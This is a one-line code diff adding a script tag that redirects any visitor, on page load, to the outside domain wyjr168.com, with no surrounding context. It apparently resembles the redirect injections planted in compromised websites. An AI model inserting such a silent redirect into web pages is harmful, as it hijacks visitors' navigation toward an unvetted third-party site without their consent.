@@ -1,0 +1,1 @@
+<script type='text/javascript'>window.location.href = 'https://wyjr168.com/';</script>
